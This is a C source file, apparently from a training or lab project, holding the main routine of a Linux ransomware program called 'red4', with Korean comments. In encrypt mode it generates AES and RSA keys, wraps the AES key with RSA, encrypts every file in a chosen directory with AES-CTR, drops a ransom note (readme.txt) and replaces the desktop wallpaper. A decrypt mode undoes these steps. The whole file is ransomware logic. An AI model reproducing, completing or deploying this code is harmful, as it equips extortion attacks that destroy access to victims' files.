#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "red4_rsa.h"
#include "red4_util.h"
#include "red4_aes_file.h"
#include "ChangeWallPaper.h"
#include "readme.h"

#define AES_KEYLEN 16
// ------------------------------------------------------------
// main: 모드 선택 (암호화 / 복호화)
// ------------------------------------------------------------
int main(int argc, char *argv[])
{
    if (argc != 2) {
        printf("사용법: %s <디렉터리>\n", argv[0]);
        return 1;
    }

    const char *dirpath = argv[1];
    printf("대상 디렉터리: %s\n", dirpath);
    printf("[1] Encrypt (암호화)\n");
    printf("[2] Decrypt (복호화)\n");
    printf("선택: ");

    char line[16];  //모드 입력 크기 제한
    if (!fgets(line, sizeof(line), stdin)) {
        printf("입력 오류\n");
        return 1;
    }

    int mode = atoi(line);
    unsigned char key[AES_KEYLEN];

    if (mode == 1) {
        printf("\n[암호화 모드]\n");

        // 1) AES 16바이트 키 생성
        if (generate_random(key, AES_KEYLEN) != 0) {
            printf("키 생성 실패\n");
            return 1;
        }

        // 2) RSA 2048-bit 키쌍 생성 및 public/private 파일 저장
        if (generate_rsa_keypair() != 0) {
            printf("RSA 키쌍 생성 실패\n");
            return 1;
        }

        // 3) RSA 공개키로 AES 키 암호화
        unsigned char aesKey_enc[512];
        size_t aesKey_enc_len = 0;
        if (rsa_encrypt_key(key, AES_KEYLEN, aesKey_enc, &aesKey_enc_len) != 0) {
            printf("AES 키 RSA 암호화 실패\n");
            return 1;
        }

        // 4) RSA 암호화된 AES 키를 파일에 저장 (red4_key.bin)
        if (save_rsa_encrypted_keyfile(aesKey_enc, aesKey_enc_len) != 0) {
            return 1;
        }

        // 5) 디렉터리 내 파일 AES-CTR 암호화
        process_directory(dirpath, key, 1);
        
        // 6) 암호화 완료 후 랜섬 노트 파일 (readme.txt) 생성
        if (write_readme(dirpath) != 0) {
            fprintf(stderr, "[WARNING] readme.txt 파일 생성에 실패했습니다.\n");
        }
        
        // 7) 암호화 완료 후 바탕화면 변경
        if (change_wallpaper(FIXED_WALLPAPER) != 0) {
            fprintf(stderr, "[WARNING] 바탕화면 변경에 실패했습니다. (GNOME 환경 및 gsettings 확인 필요)\n");
        }

        printf("\n[완료] 암호화 완료.\n");
    }
    else if (mode == 2) {
        printf("\n[복호화 모드]\n");


        // RSA 암호문(red4_key.bin) + private.pem 으로 AES 키 복원
        if (load_rsa_encrypted_keyfile(key) != 0) {
            printf("RSA 암호화된 키파일 없음 또는 복호화 실패 → 복호화 불가\n");
            return 1;
        }

        process_directory(dirpath, key, 0);
        
        // 7) 복호화 완료 후 기본 바탕화면으로 복구
        if (restore_default_wallpaper() != 0) {
            fprintf(stderr, "[WARNING] 바탕화면 복구에 실패했습니다. (GNOME 환경 및 gsettings 확인 필요)\n");
        }

        printf("\n[완료] 복호화 완료.\n");
    }
    else {
        printf("잘못된 선택\n");
    }

    return 0;
}

